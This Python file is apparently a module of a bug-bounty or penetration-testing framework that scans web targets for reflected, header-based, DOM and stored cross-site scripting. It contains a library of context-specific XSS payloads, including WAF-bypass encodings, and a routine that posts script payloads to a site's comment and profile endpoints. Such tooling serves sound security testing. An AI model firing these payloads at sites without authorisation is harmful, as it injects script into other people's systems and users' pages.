#!/usr/bin/env python3
"""
RAPTOR XSS Testing Module v1.0
===============================
Comprehensive Cross-Site Scripting detection with:
- Reflected, Stored, and DOM-based XSS detection
- Context-aware payload generation
- WAF bypass techniques
- Graph integration for vulnerability chaining
"""

import asyncio
import re
import html
from typing import List, Dict, Optional, Tuple, Set
from dataclasses import dataclass
from urllib.parse import urljoin, parse_qs, urlparse
from core.base_module import BaseModule, Finding

@dataclass
class XSSPayload:
    """Represents an XSS payload with metadata"""
    payload: str
    context: str  # html, attribute, script, url, style
    encoding: str  # raw, url_encoded, html_encoded, unicode
    waf_bypass: bool
    severity: str

class XSSTester(BaseModule):
    """
    Advanced XSS detection module.
    
    Testing methodology:
    1. Parameter discovery and classification
    2. Context analysis (where input appears in response)
    3. Payload selection based on context
    4. Reflected XSS verification
    5. Stored XSS testing (if applicable)
    6. DOM-based XSS detection
    """
    
    def __init__(self, config, stealth=None, db=None, graph_manager=None):
        super().__init__(config, stealth, db)
        self.graph = graph_manager
        self.findings: List[Finding] = []
        
        # Context-aware payload database
        self.payloads = self._load_payloads()
        
        # Tested parameters to avoid duplicates
        self.tested_params: Set[str] = set()
        
    def _load_payloads(self) -> Dict[str, List[XSSPayload]]:
        """Load context-aware XSS payloads"""
        return {
            'html': [
                XSSPayload('<script>alert(1)</script>', 'html', 'raw', False, 'High'),
                XSSPayload('<img src=x onerror=alert(1)>', 'html', 'raw', False, 'High'),
                XSSPayload('<svg onload=alert(1)>', 'html', 'raw', False, 'High'),
                XSSPayload('javascript:alert(1)', 'html', 'raw', False, 'Medium'),
                # WAF bypass variants
                XSSPayload('<img src=x onerror=\\u0061lert(1)>', 'html', 'unicode', True, 'High'),
                XSSPayload('<svg onload=\\u0061lert(1)>', 'html', 'unicode', True, 'High'),
                XSSPayload('<iframe srcdoc="<script>alert(1)</script>">', 'html', 'raw', True, 'High'),
            ],
            'attribute': [
                XSSPayload('" onfocus=alert(1) autofocus="', 'attribute', 'raw', False, 'High'),
                XSSPayload("' onmouseover='alert(1)'", 'attribute', 'raw', False, 'High'),
                XSSPayload('" onload="alert(1)"', 'attribute', 'raw', False, 'High'),
                XSSPayload('" autofocus onfocus=alert(1) "', 'attribute', 'raw', False, 'High'),
            ],
            'script': [
                XSSPayload('";alert(1);//', 'script', 'raw', False, 'Critical'),
                XSSPayload("';alert(1);//", 'script', 'raw', False, 'Critical'),
                XSSPayload('\\';alert(1);//', 'script', 'raw', False, 'Critical'),
                XSSPayload('${alert(1)}', 'script', 'raw', False, 'Critical'),
                XSSPayload('\\x3cscript\\x3ealert(1)\\x3c/script\\x3e', 'script', 'hex', True, 'Critical'),
            ],
            'url': [
                XSSPayload('javascript:alert(1)', 'url', 'raw', False, 'High'),
                XSSPayload('data:text/html,<script>alert(1)</script>', 'url', 'raw', False, 'High'),
                XSSPayload('\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74:alert(1)', 'url', 'hex', True, 'High'),
            ],
            'style': [
                XSSPayload('expression(alert(1))', 'style', 'raw', False, 'High'),
                XSSPayload('javascript:alert(1)', 'style', 'raw', False, 'High'),
                XSSPayload('\\x65\\x78\\x70\\x72\\x65\\x73\\x73\\x69\\x6f\\x6e(alert(1))', 'style', 'hex', True, 'High'),
            ]
        }
        
    async def run(self, target: str, **kwargs) -> List[Finding]:
        """
        Execute XSS testing.
        
        kwargs:
            - forms: List of form endpoints to test
            - params: Known parameters to test
            - cookies: Session cookies for authenticated testing
            - stored_test: Whether to test for stored XSS
        """
        self.logger.info("🚀 Starting RAPTOR XSS Testing Module")
        self.logger.info("=" * 60)
        
        # Phase 1: Crawl and discover parameters
        discovered_params = await self._discover_parameters(target)
        
        # Phase 2: Test URL parameters for reflected XSS
        await self._test_reflected_xss(target, discovered_params)
        
        # Phase 3: Test forms
        forms = kwargs.get('forms', [])
        for form in forms:
            await self._test_form_xss(form)
            
        # Phase 4: Test headers (X-Forwarded-For, User-Agent, Referer)
        await self._test_header_xss(target)
        
        # Phase 5: DOM-based XSS detection
        await self._test_dom_xss(target)
        
        # Phase 6: Stored XSS (if enabled)
        if kwargs.get('stored_test', False):
            await self._test_stored_xss(target, discovered_params)
            
        self.logger.info(f"✅ XSS testing complete. Findings: {len(self.findings)}")
        return self.findings
        
    async def _discover_parameters(self, target: str) -> Dict[str, List[str]]:
        """Discover URL parameters and their contexts"""
        self.logger.info("🔍 Discovering parameters...")
        
        # Common parameter names
        common_params = [
            'id', 'page', 'search', 'query', 'name', 'email', 'comment',
            'message', 'title', 'description', 'url', 'redirect', 'next',
            'callback', 'jsonp', 'q', 's', 'keyword', 'category', 'tag'
        ]
        
        discovered = {'url_params': [], 'forms': []}
        
        try:
            response = await self._make_request(target)
            if response:
                body = await response.text()
                
                # Extract forms
                forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>', 
                                 body, re.DOTALL | re.IGNORECASE)
                discovered['forms'] = forms
                
                # Extract URL parameters from links
                links = re.findall(r'href=["\']([^"\']*\?[^"\']*)["\']', body)
                for link in links:
                    if '?' in link:
                        params = parse_qs(urlparse(link).query)
                        discovered['url_params'].extend(params.keys())
                        
        except Exception as e:
            self.logger.debug(f"Parameter discovery error: {e}")
            
        # Add common params
        discovered['url_params'] = list(set(discovered['url_params'] + common_params))
        return discovered
        
    async def _test_reflected_xss(self, target: str, discovered: Dict):
        """Test for reflected XSS"""
        self.logger.info("🎯 Testing Reflected XSS...")
        
        params = discovered.get('url_params', [])
        
        for param in params:
            if param in self.tested_params:
                continue
                
            self.tested_params.add(param)
            
            # Test with unique marker to identify reflection
            marker = f"XSS{hash(param) % 10000}"
            test_url = f"{target}?{param}={marker}"
            
            try:
                response = await self._make_request(test_url)
                if not response:
                    continue
                    
                body = await response.text()
                
                # Check if marker is reflected
                if marker in body:
                    context = self._analyze_context(body, marker)
                    await self._exploit_reflection(target, param, context, marker)
                    
            except Exception as e:
                self.logger.debug(f"Reflected XSS test error: {e}")
                
    def _analyze_context(self, body: str, marker: str) -> str:
        """Analyze where the input appears in the response"""
        # Find marker position
        pos = body.find(marker)
        if pos == -1:
            return 'unknown'
            
        # Check surrounding context
        before = body[max(0, pos-50):pos]
        after = body[pos+len(marker):pos+len(marker)+50]
        
        # HTML tag context
        if re.search(r'<[^>]*$', before) and re.search(r'^[^<]*>', after):
            return 'html'
            
        # Attribute context
        if re.search(r'\w+=["\'][^"\']*$', before) and re.search(r'^[^"\']*["\']', after):
            return 'attribute'
            
        # Script context
        if '<script' in before.lower() and '</script>' in after.lower():
            return 'script'
            
        # URL context
        if re.search(r'(href|src|action)=["\'][^"\']*$', before, re.I):
            return 'url'
            
        # Style context
        if '<style' in before.lower() and '</style>' in after.lower():
            return 'style'
            
        return 'html'  # Default
        
    async def _exploit_reflection(self, target: str, param: str, context: str, marker: str):
        """Attempt to exploit confirmed reflection"""
        payloads = self.payloads.get(context, self.payloads['html'])
        
        for payload_obj in payloads:
            encoded_payload = self._encode_payload(payload_obj)
            test_url = f"{target}?{param}={encoded_payload}"
            
            try:
                response = await self._make_request(test_url)
                if not response:
                    continue
                    
                body = await response.text()
                
                # Check if payload executed (basic check)
                if self._confirm_xss(body, payload_obj.payload):
                    self._create_xss_finding(
                        target, param, payload_obj, context, 'Reflected'
                    )
                    return  # Stop after first confirmed
                    
            except Exception as e:
                self.logger.debug(f"Exploitation error: {e}")
                
    def _encode_payload(self, payload_obj: XSSPayload) -> str:
        """Encode payload based on type"""
        if payload_obj.encoding == 'url_encoded':
            from urllib.parse import quote
            return quote(payload_obj.payload)
        elif payload_obj.encoding == 'html_encoded':
            return html.escape(payload_obj.payload)
        elif payload_obj.encoding == 'unicode':
            return payload_obj.payload  # Already encoded
        elif payload_obj.encoding == 'hex':
            return payload_obj.payload  # Already encoded
        return payload_obj.payload
        
    def _confirm_xss(self, body: str, payload: str) -> bool:
        """Confirm XSS execution indicators"""
        # Look for script execution indicators
        indicators = [
            '<script>alert(1)</script>',
            'onerror=alert(1)',
            'onload=alert(1)',
            'onfocus=alert(1)',
            'javascript:alert(1)',
            'alert(1)',
            'confirm(1)',
            'prompt(1)'
        ]
        
        for indicator in indicators:
            if indicator in body:
                return True
        return False
        
    async def _test_form_xss(self, form: Dict):
        """Test form inputs for XSS"""
        self.logger.info(f"📝 Testing form: {form.get('action', 'unknown')}")
        
        # Implementation for form testing
        pass
        
    async def _test_header_xss(self, target: str):
        """Test headers for XSS (X-Forwarded-For, etc.)"""
        self.logger.info("📋 Testing Header-based XSS...")
        
        headers_to_test = [
            'User-Agent', 'X-Forwarded-For', 'X-Real-IP', 'Referer',
            'X-Requested-With', 'Accept-Language'
        ]
        
        marker = "XSSHEADER123"
        
        for header in headers_to_test:
            try:
                headers = {header: marker}
                response = await self._make_request(target, headers=headers)
                
                if response:
                    body = await response.text()
                    if marker in body:
                        context = self._analyze_context(body, marker)
                        await self._exploit_header_xss(target, header, context)
                        
            except Exception as e:
                self.logger.debug(f"Header XSS test error: {e}")
                
    async def _exploit_header_xss(self, target: str, header: str, context: str):
        """Exploit header-based XSS"""
        payloads = self.payloads.get(context, self.payloads['html'])
        
        for payload_obj in payloads:
            try:
                headers = {header: payload_obj.payload}
                response = await self._make_request(target, headers=headers)
                
                if response:
                    body = await response.text()
                    if self._confirm_xss(body, payload_obj.payload):
                        self._create_xss_finding(
                            target, header, payload_obj, context, 'Header-based'
                        )
                        return
                        
            except Exception:
                pass
                
    async def _test_dom_xss(self, target: str):
        """Test for DOM-based XSS"""
        self.logger.info("🌳 Testing DOM-based XSS...")
        
        # DOM XSS indicators in URL
        dom_indicators = [
            '#', 'javascript:', 'data:', 'vbscript:',
            'onload=', 'onerror=', 'onclick='
        ]
        
        dom_sources = [
            'document.URL', 'document.documentURI', 'location.href',
            'location.search', 'location.hash', 'document.referrer'
        ]
        
        # Test URL fragments
        test_fragments = [
            '#<img src=x onerror=alert(1)>',
            '#javascript:alert(1)',
            '#/test?callback=alert(1)'
        ]
        
        for fragment in test_fragments:
            try:
                test_url = f"{target}{fragment}"
                response = await self._make_request(test_url)
                
                if response:
                    body = await response.text()
                    # Check for DOM XSS sinks
                    if any(sink in body for sink in ['innerHTML', 'document.write', 'eval(', 'setTimeout']):
                        self.logger.warning(f"Potential DOM XSS sink found with fragment: {fragment}")
                        
            except Exception:
                pass
                
    async def _test_stored_xss(self, target: str, discovered: Dict):
        """Test for stored XSS"""
        self.logger.info("💾 Testing Stored XSS...")
        
        # Common stored XSS entry points
        entry_points = [
            '/comment', '/review', '/post', '/message', '/profile',
            '/api/comment', '/api/review', '/api/post'
        ]
        
        stored_marker = f"STOREDXSS{hash(target) % 10000}"
        
        for endpoint in entry_points:
            url = urljoin(target, endpoint)
            
            # Submit payload
            payload = f"<script>alert('{stored_marker}')</script>"
            try:
                response = await self._make_request(
                    url, method='POST', 
                    data={'content': payload, 'comment': payload, 'message': payload}
                )
                
                if response and response.status in [200, 201, 302]:
                    # Wait and check if payload appears elsewhere
                    await asyncio.sleep(2)
                    
                    check_urls = [target, url, urljoin(target, '/comments'), 
                                 urljoin(target, '/feed')]
                    
                    for check_url in check_urls:
                        check_resp = await self._make_request(check_url)
                        if check_resp:
                            body = await check_resp.text()
                            if stored_marker in body:
                                self._create_xss_finding(
                                    url, 'stored_content', 
                                    XSSPayload(payload, 'html', 'raw', False, 'Critical'),
                                    'html', 'Stored'
                                )
                                return
                                
            except Exception:
                pass
                
    def _create_xss_finding(self, target: str, param: str, payload: XSSPayload, 
                           context: str, xss_type: str):
        """Create XSS finding"""
        
        severity_map = {
            'Stored': 'Critical',
            'DOM-based': 'High',
            'Reflected': payload.severity,
            'Header-based': 'Medium'
        }
        
        finding = Finding(
            module='xss',
            title=f"{xss_type} XSS in '{param}' parameter",
            severity=severity_map.get(xss_type, 'High'),
            description=f"""
{xss_type} Cross-Site Scripting vulnerability detected in the '{param}' parameter.

**Context:** {context}
**Payload:** `{payload.payload}`
**Encoding:** {payload.encoding}
**WAF Bypass:** {'Yes' if payload.waf_bypass else 'No'}

This vulnerability allows attackers to execute arbitrary JavaScript in victims' browsers,
potentially leading to session hijacking, credential theft, or malware distribution.
            """,
            evidence={
                'parameter': param,
                'payload': payload.payload,
                'context': context,
                'encoding': payload.encoding,
                'type': xss_type
            },
            poc=f"""
1. Navigate to: {target}
2. Enter payload in '{param}' parameter: {payload.payload}
3. Observe JavaScript execution (alert box)

**curl:**
curl "{target}?{param}={payload.payload}"
            """,
            remediation="""
**Immediate:**
1. Implement output encoding based on context (HTML, JavaScript, URL, CSS)
2. Use Content Security Policy (CSP) headers
3. Validate and sanitize all user inputs

**Long-term:**
1. Adopt framework-provided auto-escaping (React, Vue, etc.)
2. Implement XSS filtering library (DOMPurify)
3. Use HttpOnly and Secure cookie flags
            """,
            cvss_score=6.1 if xss_type == 'Reflected' else 8.8 if xss_type == 'Stored' else 7.1,
            bounty_score=1500 if xss_type == 'Reflected' else 4000 if xss_type == 'Stored' else 2000,
            target=target
        )
        
        self.add_finding(finding)
        self.logger.critical(f"🚨 XSS CONFIRMED: {xss_type} in {param}")
        
    async def _make_request(self, url: str, method: str = 'GET', 
                           data: Dict = None, headers: Dict = None):
        """Override to add custom headers support"""
        base_headers = await self._get_headers()
        if headers:
            base_headers.update(headers)
        return await super()._make_request(url, method, data, base_headers)